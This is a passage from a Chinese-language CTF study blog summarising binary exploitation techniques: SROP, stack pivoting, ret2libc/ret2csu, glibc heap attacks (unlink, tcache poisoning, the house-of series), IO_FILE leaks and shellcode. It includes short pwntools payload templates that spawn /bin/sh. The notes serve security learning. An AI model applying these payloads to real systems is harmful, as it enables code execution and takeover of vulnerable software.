83 c4 08       add    rsp,0x8<br>4004fe:5d                ret<br></code></pre></td></tr></table></figure><h4 id="SROP">SROP</h4><p>SROP的全称是Sigreturn Oriented Programming。在这里<code>sigreturn</code>是一个系统调用，它在unix系统发生signal的时候会被间接地调用。</p><p>pwntools有SigreturnFrame()可以快速编写payload</p><p>例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">frame = SigreturnFrame()<br>frame.rax=constants.SYS_execve<br>frame.rdi=binsh_addr<br>frame.rsi=<span class="hljs-number">0</span><br>frame.rdx=<span class="hljs-number">0</span><br>frame.rip=system_call<br></code></pre></td></tr></table></figure><p>当内核向某个进程发送一个signal，该进程会被暂时挂起，进入内核态，</p><p>然后内核为该进程保存相应的上下文，跳转到之前注册好的signal handler中处理相应signal。内核会帮用户进程将其上下文保存在该进程的栈上，然后在栈顶填上一个地址<code>rt_sigreturn</code>，这个地址指向一段代码，在这段代码中会调用<code>sigreturn</code>系统调用。因此，当signal handler执行完之后，栈指针（stack pointer）就指向<code>rt_sigreturn</code>，所以，signal handler函数的最后一条<code>ret</code>指令会使得执行流跳转到这段sigreturn代码，被动地进行<code>sigreturn</code>系统调用。</p><p>当signal handler返回之后内核为该进程恢复之前保存的上下文，最后恢复进程的执行</p><p>第一、这个<code>Signal Frame</code>是被保存在用户进程的地址空间中的，是用户进程可读写的；</p><p>第二、内核并没有将保存的过程和恢复的过程进行一个比较，也就是说，在<code>sigreturn</code>这个系统调用的处理函数中，内核并没有判断当前的这个<code>Signal Frame</code>就是之前内核为用户进程保存的那个<code>Signal Frame</code>。</p><p><strong>例</strong>：假设一个攻击者可以控制用户进程的栈，那么它就可以伪造一个<code>Signal Frame</code></p><p>在这个伪造的<code>Signal Frame</code>中，将<code>rax</code>设置成59（即<code>execve</code>系统调用号），将<code>rdi</code>设置成字符串<code>/bin/sh</code>的地址（该字符串可以是攻击者写在栈上的），将<code>rip</code>设置成系统调用指令<code>syscall</code>的内存地址，最后，将<code>rt_sigreturn</code>手动设置成<code>sigreturn</code>系统调用的内存地址。那么，当这个伪造的<code>sigreturn</code>系统调用返回之后，相应的寄存器就被设置成了攻击者可以控制的值，在这个例子中，一旦<code>sigreturn</code>返回，就会去执行<code>execve</code>系统调用，打开一个shell。</p><p><strong>总体来说：</strong></p><p>就是在栈上伪造fake_SigreturnFrame，我们利用sigreturn的机制，在返回时带参数的执行某个系统调用</p><h4 id="Stack-migration">Stack migration</h4><p>溢出长度不够时，就要用到栈迁移了，将ebp迁移到bss段或data段，构造gadget然后在这里执行</p><blockquote><p>leave相当于汇编 mov rsp,rbp;pop rbp;<br>ret相当于汇编pop eip;</p></blockquote><p>要进行<strong>栈溢出</strong>将<strong>ebp</strong>修改为<strong>目标地址</strong>(也就是需要进行迁移的地址)，并且把<strong>ret addr</strong>填充为<strong>leave;ret指令的地址</strong></p><p><img src="/2024/01/26/pwn%E6%80%BB%E7%BB%93/20230725214502-74acf9e2-2af1-1.png" alt="20230725214502-74acf9e2-2af1-1"></p><p>开始执行第一个<strong>leave;ret</strong>，首先是确保可以栈溢出将<strong>ebp,ret_addr</strong>都可以覆盖,之后将ebp修改为需要迁移到的地址(一般是我们构造好ROP链的位置)，ret_addr修改为leave;ret的指令的地址，之后<strong>mov esp,ebp</strong>，esp和ebp处于同一位置，指向同一个地址，之后<strong>pop ebp</strong>，将栈顶的内容弹出给ebp，之后我们的ebp就来到了<strong>目标地址</strong>，再<strong>ret-&gt;pop eip</strong>，我们的<strong>存有leave_ret_addr的地址</strong>就作为返回地址存储到了<strong>eip</strong>中，接下来立马再次执行一次<strong>leave;ret</strong></p><p>第二个<strong>leave;ret</strong>,此时ebp和esp的位置互换了，之后再执行<strong>mov ebp,esp</strong>就可以将esp迁移到ebp的位置，至此我们的esp,ebp已经完全迁移到目标地址了，之后再<strong>pop ebp</strong>，将栈顶没用的内容弹出，此时栈顶的内容就是<strong>system@plt</strong>的地址了，这个时候我们再执行ret-&gt;pop eip的话，其实就是将栈顶的内容也就是(可以是sytem@plt)弹入到eip中，我们接下来就是<strong>执行system@plt</strong>从而getshell</p><ul><li>第一次leave;ret，其实就是让ebp放入目标地址</li><li>第二次leave;ret，就是将esp也迁移到ebp的位置，之后pop ebp，esp指向下一个内存单元，如上图，这里esp是指向了system@plt，从而getshell</li></ul><h4 id="ret2shellcode">ret2shellcode</h4><p>shellcode要写在可以执行的段，控制程序流执行它</p><h4 id="ret2libc">ret2libc</h4><ul><li>第一步泄露libc地址，得到libc_base，计算出相应要用的地址（libc_base+XX函数地址）</li><li>第二步能溢出覆盖能控制ret，布置好ROP</li><li>第三步返回执行</li></ul><h4 id="ret2csu">ret2csu</h4><p>简单来说就是利用libc_csu_init中的两段代码片段来实现(rdi,rsi,rdx)3个参数的传递（间接性的传递参数）</p><p>x64 下的 __libc_csu_init 这个函数是用来对 libc 进行初始化操作的，而一般的程序用 libc 函数，所以这个函数一定会存在。</p><p>(不同版本的这个函数有一定的区别，需要对下面的payload略作修改)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">csu</span>(<span class="hljs-params">rdi,rsi,rdx,function</span>):<br>    csu_front_addr=<span class="hljs-number">0x400740</span><br>    csu_end_addr=<span class="hljs-number">0x40075A</span><br>    payload = <span class="hljs-string">b&#x27;&#x27;</span><br>    payload += p64(csu_end_addr) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">1</span>) + p64(function) + p64(<br>        rdi) + p64(rsi) + p64(rdx)<br>    payload += p64(csu_front_addr)<br>    payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x38</span><br>    <span class="hljs-keyword">return</span> payload<br></code></pre></td></tr></table></figure><h4 id="ret2dl-resolve">ret2dl_resolve</h4><p>大致是栈迁移到bss段伪造fake_linkmap结构体（伪造一整套延迟绑定用到的结构体欺骗系统）</p><ul><li>用于应对只能溢出0x10字节的情况，没有更多泄露手段</li><li>保护不能开启FULL RELRO（got表全都确定好地址了自然是不行）</li><li>理解较难，利用相对模板化</li><li>pwntools有Ret2dlresolvePayload模块</li></ul><h3 id="Heap-Exploitation">Heap Exploitation</h3><h4 id="realloc-malloc-calloc区别">realloc/malloc/calloc区别</h4><ul><li><p>malloc</p><blockquote><p>void* malloc (size_t size);</p></blockquote><p>根据size来申请内存，使用ptmalloc进行内存管理</p></li><li><p>realloc</p><blockquote><p>void* realloc (void* realloc_ptr, size_t size);</p></blockquote><p>可以对内存的大小做灵活的调整，具体参数设置会有如下效果：</p><blockquote><p>size == 0 ，这个时候等同于free<br>realloc_ptr == 0 &amp;&amp; size &gt; 0 ， 这个时候等同于malloc<br>malloc_usable_size(realloc_ptr) &gt;= size， 这个时候等同于edit<br>malloc_usable_size(realloc_ptr) &lt; size， 这个时候才是malloc一块更大的内存，将原来的内容复制过去，再将原来的chunk给free掉</p></blockquote></li><li><p>calloc</p><blockquote><p>void* calloc (size_t num, size_t size);</p></blockquote><p>calloc函数有将申请到的空间初始化为0的功能，而malloc函数没有这个功能。</p><p>使用calloc申请内存时不会分配 tcache chunk 中的 chunk 。</p></li></ul><p>由于 __ realloc_hook 与  __ malloc_hook 相邻，因此在 heap exploit 中有着这样一种手法便是同时修改这两个 hook，通过 __libc_realloc 中的一些 gadget 调整堆栈以满足one_gadget一些特定的要求</p><p>这是因为one_gadget并非任何时候都是通用的，都有一定的先决条件</p><h4 id="malloc-hook-free-hook-exit-hook运用">malloc_hook/free_hook/exit_hook运用</h4><p>在低版本中，有很多好用的hook，假如我们能任意地址写，就能很方便的改写这些hook帮助我们getshell</p><p>例：修改free_hook为system，释放带有/bin/sh字符串的堆，即可getshell</p><p>所常说的exit hook，就是 _ rtld_global结构体中的两个函数指针_ dl_rtld_lock_recursive与_dl_rtld_unlock_recursive，我们只需要改写这两个中的一个指针为one_gadget，执行exit后就可以拿到shell,不同版本地址有所不同</p><h4 id="泄露地址的方法">泄露地址的方法</h4><h5 id="libc地址">libc地址</h5><p>（除 fastbin 与 tcache 以外）bins 与空闲 chunk 间构成双向链表结构，利用这个特性我们便可以泄漏出main_arena 的地址，进而泄漏出 libc 的基址，一般用 unsorted bin 中的 chunk 泄露 libc 地址</p><h5 id="heap地址">heap地址</h5><p>libc2.29及以上，tcache key 所用的值便是 tcache 结构体本身的地址，故若我们能够打印 tcache key ，就能直接获得堆基址</p><p>glibc2.32 起新增了 safe-linking 机制用以保护存放在 tcache 与 fastbin 中的 chunk 指针，保证 chunk 链表的完整性</p><p>但是 safe-linking 机制同样存在着其缺点：对于 tcache 而言，第一个被放入 tcache 的 chunk 的 fd 指针在经过 safe-linking 后会被写入一个<strong>未加密的堆上相关地址</strong>（与 0 异或），因而我们可以通过该 chunk 的 fd 指针泄露堆基址，有了堆基址我们便能很轻松地绕过 safe-linking 机制的保护</p><p>同样地，若是我们能够打印 tcache 中 free chunk 的 bd 字段，则同样可以获得 tcache key，以此泄露堆基址，绕过 safe-linking</p><h4 id="Chunk-Extend-and-Overlapping">Chunk Extend and Overlapping</h4><p>堆块重叠即我们<strong>同时拥有两个或以上的下标指向同一个 chunk</strong>（同一个地址），在这样的情况下便可以手动实现 double free 、地址泄露（例如释放一个下标后通过另一个下标打印 chunk 内容从而获得<strong>堆/libc</strong>相关地址）等各种利用，十分方便</p><h4 id="Unlink">Unlink</h4><p>unlink的作用就是摘掉chunk</p><p><img src="/2024/01/26/pwn%E6%80%BB%E7%BB%93/20200911135522507.png" alt="20200911135522507"></p><p><img src="/2024/01/26/pwn%E6%80%BB%E7%BB%93/20200911152738722.png" alt="20200911152738722"></p><p>在执行free()函数时执行了 _int_free()函数，在 _int_free()函数中调用了unlink宏</p><p>unlink其实是libc中定义的一个宏，libc2.23里的定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            </span><br>    FD = P-&gt;fd;      <br>    BK = P-&gt;bk;      <br>    <span class="hljs-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="hljs-number">0</span>))      <br>      malloc_printerr (check_action, <span class="hljs-string">&quot;corrupted double-linked list&quot;</span>, P, AV);  <br>    <span class="hljs-keyword">else</span> &#123;      <br>        FD-&gt;bk = BK;      <br>        BK-&gt;fd = FD;      <br>        <span class="hljs-keyword">if</span> (!in_smallbin_range (P-&gt;size)      <br>            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>)) &#123;      <br>    <span class="hljs-keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="hljs-number">0</span>)      <br>|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="hljs-number">0</span>))    <br>      malloc_printerr (check_action,      <br>       <span class="hljs-string">&quot;corrupted double-linked list (not small)&quot;</span>,    <br>       P, AV);      <br>            <span class="hljs-keyword">if</span> (FD-&gt;fd_nextsize == <span class="hljs-literal">NULL</span>) &#123;      <br>                <span class="hljs-keyword">if</span> (P-&gt;fd_nextsize == P)      <br>                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;      <br>                <span class="hljs-keyword">else</span> &#123;      <br>                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;      <br>                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;      <br>                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;      <br>                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;      <br>                  &#125;      <br>              &#125; <span class="hljs-keyword">else</span> &#123;      <br>                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;      <br>                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;      <br>              &#125;      <br>          &#125;      <br>      &#125;      <br>&#125;<br><br></code></pre></td></tr></table></figure><p>这里面会有对双向链表进行检查</p><blockquote><p><strong>2.23里的chunk状态检查</strong>：</p><p><strong>检查1</strong>：检查与被释放chunk相邻高地址的chunk的prevsize的值是否等于被释放chunk的size大小</p><p><strong>检查2</strong>：检查与被释放chunk相邻高地址的chunk的size的P标志位是否为0</p><p><strong>检查3</strong>：检查前后被释放chunk的fd和bk</p></blockquote><p>利用思路大致来讲就是伪造一个chunk，让系统以为它是空闲的chunk，然后free触发unlink向上合并，造成堆重叠，效果就是bss段里的指针数组指向它自己（我自己认为是另一种doublefree）,可以任意地址写</p><blockquote><p>要理解它还得是实打实做几道题，这些个题目都可以用unlink解</p><p><a href="https://nqoinaen.cn/2020/11/24/buu%E5%88%B7%E9%A2%98/#hitcon2014-stkof">hitcon2014_stkof</a></p><p><a href="https://blog.csdn.net/m0_51251108/article/details/121176333?ops_request_misc=%7B%22request%5Fid%22%3A%22170650880116777224418705%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fblog.%22%7D&amp;request_id=170650880116777224418705&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-2-121176333-null-null.nonecase&amp;utm_term=unlink">zctf_2016_note3</a></p><p><a href="https://nqoinaen.cn/2020/11/24/buu%E5%88%B7%E9%A2%98/#hitcontraining-unlink">hitcontraining_unlink</a></p><p><a href="https://nqoinaen.cn/2020/11/24/buu%E5%88%B7%E9%A2%98/#hitcontraining-bamboobox">hitcontraining_bamboobox</a></p><p><a href="https://blog.csdn.net/m0_51251108/article/details/121411787?spm=1001.2014.3001.5502">sctf_2019_easy_heap</a></p><p><a href="https://blog.csdn.net/m0_51251108/article/details/121429481?spm=1001.2014.3001.5502">x_nuca_2018_offbyone2</a></p></blockquote><h4 id="Fastbin-Attack">Fastbin Attack</h4><h5 id="size检查">size检查</h5><p>在malloc取出fastbin中的chunk时会检查其size字段，<strong>若与其对应下标不相符则会引发程序abort，限制了我们所能构造fake chunk的位置</strong>，但该size检查<strong>不会检查标志位</strong></p><blockquote><p>一般fastbin attack中分配到__ malloc_hook附近的fake chunk通常都是malloc(0x60)，也就是size == 0x71，这是因为在__malloc_hook - 0x23这个地址上fake chunk的SIZE的位置刚好是<code>0x7f</code>，满足了绕过fastbin的size检查的要求</p></blockquote><h4 id="Large-Bin-Attack">Large Bin Attack</h4><p><code>glibc</code>高版本移除了<code>__malloc_hook/__free_hook/__realloc_hook</code>等等一众<code>hook</code>全局变量，<code>ctf</code>中<code>pwn</code>题对<code>hook</code>钩子的利用将逐渐成为过去式。而想要在高版本利用成功，基本上就离不开对<code>IO_FILE</code>结构体的伪造与<code>IO</code>流的攻击。<code>largebin attack</code>是高版本(2.34及以后)中为数不多的可以任意地址写一个堆地址的方法</p><blockquote><p>libc2.31后的largebin attack：<br>我们能控制在large_bin中的chunkA的bk_nextsize为target-0x20（target就是我们要改写的地址）<br>然后如果有个在unsortbin中的chunkB，A的size要大于B的size，接着我们申请一个大于B的size的堆，<br>B就会放到largebin里，然后我们可以发现target就被改写为了B这个堆的地址</p></blockquote><h4 id="Tcache-Poisoning">Tcache Poisoning</h4><p>通过诸如 tcache double free 等方式，我们可以达到修改 tcache_entry 的 next 指针的目的，从而在任意地址分配到一个 chunk，这种手法也叫做<strong>tcache poisoning</strong></p><h4 id="Fastbin-Reverse-to-Tcache">Fastbin Reverse to Tcache</h4><blockquote><p>fastbin reverse to tcache的攻击效果是往target-0x18处的地址写入对应tcache的bk指针，也就是一个堆地址</p></blockquote><h4 id="Tcache-Stashing-Unlink-Attack">Tcache-Stashing-Unlink-Attack</h4><p><strong>攻击目标</strong></p><ol><li>向任意指定位置写入一个地址（可以认为是很大的值）。（更深的利用方式可任意地址读写）</li><li>向任意地址分配一个Chunk。</li></ol><p><strong>攻击前提</strong></p><ol><li>能控制 Small Bin Chunk 的 bk 指针。</li><li>程序可以越过Tache取Chunk。(使用calloc即可做到)</li><li>程序至少可以分配两种不同大小且大小为unsorted bin的Chunk。</li></ol><blockquote><p><a href="https://blog.csdn.net/m0_51251108/article/details/127121786?spm=1001.2014.3001.5502">hitcon_ctf_2019_one_punch</a></p><p><a href="https://blog.csdn.net/m0_51251108/article/details/127078196?spm=1001.2014.3001.5502">2020 新春红包题</a></p></blockquote><p><a href="https://www.anquanke.com/post/id/198173">Tcache Stashing Unlink Attack利用思路-安全客 - 安全资讯平台 (anquanke.com)</a></p><h4 id="ROP-in-heap">ROP in heap</h4><h5 id="environ">environ</h5><h5 id="setcontext">setcontext</h5><h6 id="2-29以前">2.29以前</h6><p><strong>setcontext + 53</strong></p><h6 id="2-29以后">2.29以后</h6><h4 id="House">House</h4><p><code>Glibc</code> 的 <code>house of</code> 系列攻击手法基于都是围绕着堆利用和 <code>IO FILE</code> 利用，更多是在打组合拳。可以跟着<a href="https://github.com/shellphish/how2heap">how2heap</a>进行学习，这里列举一些我所知道的</p><p><strong>House Of Force</strong></p><p>House Of Force着眼点在于对top chunk 的攻击</p><blockquote><p>练习：</p><p><a href="https://nqoinaen.cn/2020/11/24/buu%E5%88%B7%E9%A2%98/#gyctf-2020-force">gyctf_2020_force</a></p><p><a href="https://nqoinaen.cn/2020/11/24/buu%E5%88%B7%E9%A2%98/#hitcontraining-bamboobox">hitcontraining_bamboobox</a></p></blockquote><p><strong>House of Orange</strong></p><p>用于应对没有free这种情况</p><blockquote><p><a href="https://blog.csdn.net/m0_51251108/article/details/121344075?ops_request_misc=%7B%22request%5Fid%22%3A%22170651507116800180673323%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fblog.%22%7D&amp;request_id=170651507116800180673323&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-121344075-null-null.nonecase&amp;utm_term=orange&amp;spm=1018.2226.3001.4450">houseoforange_hitcon_2016（unsortbin attack，fsop）-CSDN博客</a></p></blockquote><p><strong>House of Roman</strong></p><p><strong>House of botcake</strong></p><p>可以在仅使用一次uaf的情况下，绕过tcache的key值检测，造成tcache poioning的效果，并且能重复使用</p><blockquote><p>练习：</p><p>[DASCTF X GFCTF 2022十月挑战赛magic_book](<a href="https://nqoinaen.cn/2022/10/28/DASCTF">https://nqoinaen.cn/2022/10/28/DASCTF</a> X GFCTF 2022十月挑战赛/#magic-book)</p></blockquote><p><strong>House of Pig</strong></p><p><strong>House of banana</strong></p><p><strong>House of Corrosion</strong></p><p><strong>House of emma</strong></p><p><strong>House of wiki</strong></p><p><strong>House of cat</strong></p><p>House of Cat利用了House of emma的虚表偏移修改思想，通过修改虚表指针的偏移，避免了对需要绕过TLS上 <strong>_pointer_chk_guard</strong>的检测相关的IO函数的调用，转而调用**_IO_wfile_jumps<strong>中的</strong>_IO_wfile_seekoff<strong>函数，然后进入到</strong>_IO_switch_to_wget_mode<strong>函数中来攻击，从而使得攻击条件和利用变得更为简单。并且house of cat在</strong>FSOP<strong>的情况下也是可行的，只需修改虚表指针的偏移来调用</strong>_IO_wfile_seekoff<strong>即可（通常是结合</strong>__malloc_assert**，改vtable为**_IO_wfile_jumps+0x10**）。</p><p><strong>利用条件</strong></p><p>1.能够任意写一个可控地址。<br>2.能够泄露堆地址和libc基址。<br>3.能够触发IO流（FSOP或触发__malloc_assert，或者程序中存在puts等能进入IO链的函数），执行IO相关函数。</p><blockquote><p>练习：</p><p><a href="https://blog.csdn.net/m0_51251108/article/details/127290280?spm=1001.2014.3001.5502">house of cat 学习-CSDN博客</a></p><p><a href="https://blog.csdn.net/m0_51251108/article/details/127374315?spm=1001.2014.3001.5502">house of emma-CSDN博客</a>house of emma同名题用house of cat 来解</p></blockquote><p><strong>House of apple</strong></p><p><strong>House of apple2</strong></p><blockquote><p>练习：</p><p><a href="https://blog.csdn.net/m0_51251108/article/details/127416752?spm=1001.2014.3001.5501">2021祥云杯PassWordBox_ProVersion-CSDN博客</a>使用了其中两种调用链来解</p></blockquote><p><strong>House of apple3</strong></p><p><strong>house利用方法汇总：</strong><a href="https://roderickchan.github.io/zh-cn/2023-02-27-house-of-all-about-glibc-heap-exploitation/#2-house-of%E7%B3%BB%E5%88%97">Glibc堆利用之house of系列总结 - roderick - record and learn! (roderickchan.github.io)</a></p><h3 id="I-O-File-Exploitation">I/O File Exploitation</h3><h4 id="I-O-leak">I/O leak</h4><p>在pwn题中，当遇到没有可以用来泄露的功能时，我们一般将堆块分配到stdout指针处存储的_IO_2_1_stdout_该IO_FILE结构体处，修改其 _ flags为0xfbad1800，将后面三个read指针置空，将_ IO_write_base处的第一个字节改为0x58，后面的_ IO_write_ptr和_ IO_write_end保持不变。之后当程序遇到puts函数时就会打印 _ IO_write_base到_ IO_write_ptr之间的内容，按照上面步骤改动的话，我们泄露出的第一个libc地址是_IO_file_jumps。<br>  至于为啥需要flags=0xfbad1800（flags也可以是0xfbad3887），这里分析起来十分复杂，可以参见puts源码，只能说为了达到输出效果需要这样设置，另外该flags这样设置只是针对puts函数，其余打印函数略有不同</p><h4 id="FSOP">FSOP</h4><p>FSOP即 File Stream Oriented Programme——文件流导向编程，即基于 glibc 中文件流相关的一种劫持手法，其核心思想便是通过劫持文件流的相关流程以达到控制程序执行流的目的</p><h3 id="shellcode">shellcode</h3><p><code>shellcode</code> 是一段可被 <code>CPU</code> 直接执行的程序码,使用 <code>shellcode</code> 进行攻击是一项经典而强大的技术，借助 <code>shellcode</code> 几乎可以完成任何事情，包括但不限于泄露敏感信息、反弹 <code>shell</code>、布置后门等。</p><p>编写 <code>shellcode</code> 的方式有很多，而方式的选择取决于实际场景。如当需要编写复杂的 <code>shellcode</code> 的时候，需要手搓；当需要注入特定模板的 <code>shellcode</code> 时，可以采用工具生成；当需要观察 <code>shellcode</code> 的字符、长度时，可以采用在线网站生成。</p><p><a href="https://roderickchan.github.io/zh-cn/2023-02-20-the-art-of-shellcode/">Linux下的shellcode技巧总结 - roderick - record and learn! (roderickchan.github.io)</a></p><p><a href="https://bbs.kanxue.com/thread-274652.htm#msg_header_h2_7">可见shellcode字符的艺术</a></p><h3 id="Tools">Tools</h3><h4 id="IDA-Pro">IDA Pro</h4><p>ida在pwn中用的不深，会一些基本的，然后会IDA_Patch即可</p><p>F5反汇编</p><p>alt+T</p><p>shift+f12查看程序里的字符串</p><p>n：更改变量的名称</p><p>g：直接跳转到某个地址</p><p>/ ：在反编译后伪代码的界面中写下注释</p><p>strip去符号的题，加签名文件，可以显示部分函数名</p><h4 id="pwndbg-peda-gef">pwndbg/peda/gef</h4><p>三者我认为pwndbg最好用，有一些好用的指令，在用gdb连接qemu进行调试时也不太卡</p><ul><li><p>基本指令</p><ul><li>si//单步步入，遇到调用跟进函数中</li><li>ni //单步步过，遇到函数不跟进</li><li>b *地址//段指定地址，b *main</li><li>b *$ rebase(0x123456) //$rebase 在调试开PIE的程序的时候可以直接加上程序的随机地址</li><li>vmmap //内存分配情况</li><li>r//运行</li><li>c//继续</li></ul></li><li><p>查看内存指令x</p><ul><li>x/32gx 地址  //我喜欢用这个，打印地址的内容以16进制</li><li>x /10i 0x123456 //从0x123456处向后显示十条汇编指令</li></ul></li><li><p>打印指令p</p></li><li><p>修改指令set</p><ul><li><code>set $rdi=0x10</code> //把rdi寄存器的值变为0x10</li><li><code>set *(0x123456)=0x10</code> //0x123456地址的值变为0x10，<strong>注意带星号</strong></li></ul></li><li><p>堆操作指令</p><ul><li><p><code>arena</code> //显示arena的详细信息</p><ul><li><code>arenas</code> //显示所有arena的基本信息</li><li><code>arenainfo</code> //<strong>好看的显示</strong>所有arena的信息</li></ul></li><li><p><code>bins</code> //</p><p>常用，查看所有种类的堆块的链表情况</p><ul><li><code>fastbins</code> //单独查看fastbins的链表情况</li><li><code>largebins</code> //同上，单独查看largebins的链表情况</li><li><code>smallbins</code> //同上，单独查看smallbins的链表情况</li><li><code>unsortedbin</code> //同上，单独查看unsortedbin链表情况</li><li><code>tcachebins</code> //同上，单独查看tcachebins的链表情况</li><li><code>tcache</code> //查看tcache详细信息</li></ul></li><li><p><code>heap</code> //</p><p>数据结构的形式显示所有堆块，会显示一大堆</p><ul><li><code>heapbase</code> //<strong>查看堆起始地址</strong></li><li><code>heapinfo</code>、<code>heapinfoall</code> //显示堆得信息，和bins的挺像的，<strong>没bins好用</strong></li><li><code>parseheap</code> //显示堆结构，<strong>很好用</strong></li></ul></li><li><p><code>tracemalloc</code> //<strong>好用</strong>，会跟提示所有操作堆的地方</p></li></ul></li><li><p>其他pwndbg插件独有指令</p><ul><li><code>cyclic 50</code> //生成50个用来溢出的字符，如：aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama</li><li><code>$reabse</code> //<strong>开启PIE的情况的地址偏移</strong><ul><li><code>b *$reabse(0x123456)</code> //断住PIE状态下的二进制文件中0x123456的地方</li><li><code>codebase</code> //打印PIE偏移，<strong>与rebase不同，这是打印，rebase是使用</strong></li></ul></li><li><code>stack</code> //<strong>查看栈</strong></li><li><code>retaddr</code> //打印包含返回地址的栈地址</li><li><code>canary</code> //直接看canary的值</li><li><code>plt</code> //查看plt表</li><li><code>got</code> //查看got表</li><li><code>hexdump</code> //像IDA那样显示数据，<strong>带字符串</strong></li></ul></li></ul><h4 id="pwntools">pwntools</h4><p>必备的库，会用它可以大大加快编写exp的速度</p><p>要充分了解它的许多有用模块可从<a href="http://docs.pwntools.com/">官方文档</a>着手</p><h4 id="seccomp-tools">seccomp-tools</h4><p>Secommp (SECure COMPuting) 是 Linux 内核 2.6.12 版本引入的安全模块，主要是用来限制某一进程可用的系统调用 (system call)。</p><p>我们可以用这个工具来可以分析程序的seccomp状态，看禁用了哪些系统调用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">seccomp-tools dump ./pwn<br></code></pre></td></tr></table></figure><h4 id="patchelf">patchelf</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">patchelf --replace-needed libc.so.6 你要换的libc的硬路径 ./pwn<br>patchelf --set-interpreter ld的硬路径 ./pwn<br></code></pre></td></tr></table></figure><h4 id="one-gadget">one_gadget</h4><p>可以用来寻找万能gadget去getshell</p><p>可以设置参数查找等级，找到更多可用的gadget</p><p>例：<code>one_gadget ./libc-2.27.so -l 1</code> 设置等级level1</p><h4 id="glibc-all-in-one">glibc-all-in-one</h4><h2 id="知识储备">知识储备</h2><h3 id="常用的系统调用">常用的系统调用</h3><h4 id="system">system</h4><p>要rop出<code>system(“/bin/sh\x00”)</code></p><p>参数</p><blockquote><p>rdi=“/bin/sh\x00”字符串的地址</p></blockquote><h4 id="execve">execve</h4><blockquote><p>int execve(const char *filename, char *const argv[], char *const envp[]);</p></blockquote><p>要rop出<code>execve('/bin/sh\x00',0,0)</code></p><p>参数:</p><blockquote><p>rdi='/bin/sh\x00’字符串的地址<br>rsi=0 or 地址-&gt;0<br>rdx=0 or 地址-&gt;0</p></blockquote><h4 id="open-read-write">open/read/write</h4><h4 id="mprotect">mprotect</h4><p>int mprotect(const void *start, size_t len, int prot)</p><p>可以用于给某段地址提升权限为可读可写可执行（rwx）,只需要prot参数等于7(111B)</p><p>start必须是一个内存页的起始地址，并且区间长度len必须是页大小的整数倍,不然会调用失败</p><h3 id="ptmalloc堆数据结构">ptmalloc堆数据结构</h3><h3 id="ptmalloc堆管理机制">ptmalloc堆管理机制</h3><h3 id="More">More</h3><h2 id="小结">小结</h2><h2 id="参考">参考</h2><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/environment/">Environment - CTF Wiki (ctf-wiki.org)</a></p><p><a href="https://lantern.cool/note-pwn-linux-protect/">Linux 常用保护机制 | Lantern’s 小站</a></p><p><a href="https://www.cnblogs.com/murkuo/p/15965270.html">pwndbg 基本操作指令 - MuRKuo - 博客园 (cnblogs.com)</a></p><p><a href="https://xz.aliyun.com/t/12738?time__1311=mqmhDvOGOFYKDsD7Gt0%3DbG%3DD8UwZ2xxi%3D4D&amp;alichlgref=https%3A%2F%2Fwww.bing.com%2F">栈迁移原理深入理解以及实操 - 先知社区 (aliyun.com)</a></p><p><a href="https://blog.csdn.net/chennbnbnb/article/details/109284780">glibc2.31下的新double free手法/字节跳动pwn题gun题解_glibc 2.31下存在doublefree吗-CSDN博客</a></p><p><a href="https://blog.csdn.net/qq_54218833/article/details/130426404">CTF-pwn pwntools用法探索</a></p><p><a href="https://blog.csdn.net/qq_41202237/article/details/108481889">好好说话之unlink_unlink 操作什么时候发生-CSDN博客</a></p><p><a 